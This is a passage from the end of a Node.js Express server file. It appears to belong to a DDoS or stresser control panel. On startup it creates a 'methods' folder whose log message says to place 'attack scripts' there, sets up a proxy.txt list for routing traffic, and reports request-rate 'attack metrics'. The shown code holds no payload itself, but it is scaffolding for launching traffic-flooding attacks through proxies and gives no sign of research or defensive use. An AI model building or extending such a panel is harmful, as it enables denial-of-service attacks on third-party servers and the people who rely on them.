  res.status(500).json({ error: 'Internal server error' });
});

// Start server
app.listen(port, () => { 
  fetchData(); 
  
  // Create methods directory if it doesn't exist
  if (!fs.existsSync('./methods')) {
    fs.mkdirSync('./methods');
    console.log('[SETUP] Created methods directory');
  }
  
  // Create proxy.txt if it doesn't exist
  if (!fs.existsSync('./proxy.txt')) {
    fs.writeFileSync('./proxy.txt', '# Add your proxies here\n# Format: ip:port\n');
    console.log('[SETUP] Created proxy.txt template');
  }
  
  console.log('\n📁 Required directories:');
  console.log('   - /methods/ - Place your attack scripts here');
  console.log('   - proxy.txt - Add your proxies (one per line)');
  console.log('📊 Live Stats: Tracking RPS, RPM, and attack metrics\n');
});

